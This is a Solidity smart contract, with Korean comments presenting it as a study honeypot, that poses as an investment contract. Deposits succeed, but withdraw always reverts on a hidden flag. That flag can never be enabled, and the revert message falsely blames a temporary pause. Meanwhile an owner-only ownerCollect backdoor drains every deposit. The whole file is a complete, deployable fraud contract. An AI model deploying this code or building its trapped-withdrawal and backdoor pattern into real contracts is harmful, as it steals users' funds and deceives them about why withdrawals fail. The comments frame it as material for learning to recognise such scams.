// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Honeypot
 * @notice 학습용 허니팟 컨트랙트
 * 겉으로는 정상 투자 컨트랙트처럼 보이지만
 * 출금 함수 내부에 숨겨진 조건으로 인해 출금이 항상 실패함
 */
contract Honeypot {
    address public owner;
    mapping(address => uint256) public balances;
    bool private _withdrawEnabled = false; // 숨겨진 스위치

    event Deposited(address indexed user, uint256 amount, uint256 blockNumber);
    event WithdrawAttempted(address indexed user, uint256 amount,
                            bool success, uint256 blockNumber);

    constructor() {
        owner = msg.sender;
    }

    // 입금: 정상적으로 작동하여 신뢰를 유도
    function deposit() external payable {
        require(msg.value > 0, "Send ETH");
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value, block.number);
    }

    // 출금: 숨겨진 조건으로 항상 실패
    // 겉으로는 정상 출금 함수처럼 보임
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        require(_withdrawEnabled, "Withdrawals temporarily paused");
        // _withdrawEnabled는 owner만 true로 변경 가능하지만
        // owner는 절대 활성화하지 않음

        balances[msg.sender] -= amount;
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "Transfer failed");

        emit WithdrawAttempted(msg.sender, amount, true, block.number);
    }

    // owner만 출금 가능한 백도어
    function ownerCollect() external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = address(this).balance;
        (bool success, ) = payable(owner).call{value: balance}("");
        require(success, "Transfer failed");
    }

    // owner가 숨긴 스위치 (외부에서 호출 불가능하게 설계)
    function _enableWithdraw() internal {
        _withdrawEnabled = true;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
